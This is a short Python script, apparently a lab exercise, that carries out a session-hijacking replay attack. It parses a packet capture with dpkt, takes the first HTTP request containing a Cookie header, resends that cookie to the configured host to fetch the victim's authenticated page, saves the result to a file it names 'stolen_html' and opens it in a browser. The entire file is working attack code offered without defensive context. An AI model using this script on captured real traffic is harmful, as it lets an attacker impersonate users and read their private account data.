import dpkt
import datetime
import urllib2
import webbrowser

import config

def replay_attack():
	pcap = pcap_parser(config.PCAP)
	cookie_info = get_cookie(pcap)
	response = replay_cookie(cookie_info)
	download_html(response, config.HTML)
	webbrowser.open(config.HTML, new=2)

def pcap_parser(file):
	pcap = dpkt.pcap.Reader(open(file))
	return pcap

def get_cookie(pcap):
	for ts, buf in pcap:
		packet = dpkt.ethernet.Ethernet(buf)
		ip = packet.data
		tcp = ip.data
		html = tcp.data
		if tcp.dport == int(config.PORT) and len(html) > 0:
			http = dpkt.http.Request(html)
			header = http.headers
			if header.has_key('cookie'):
				return {"cookie": header.get('cookie'), "url" : http.uri}

def replay_cookie(cookie_info):
	url = "http://" + config.HOST + ":" + config.PORT + cookie_info['url']
	request = urllib2.Request(url)
	request.add_header('Cookie', cookie_info['cookie'])     
	return urllib2.urlopen(request)
	

def download_html(response, stolen_html):
	html = open(stolen_html, "w")
	html.write(response.read())
	html.close()

if __name__ == "__main__":
	replay_attack()
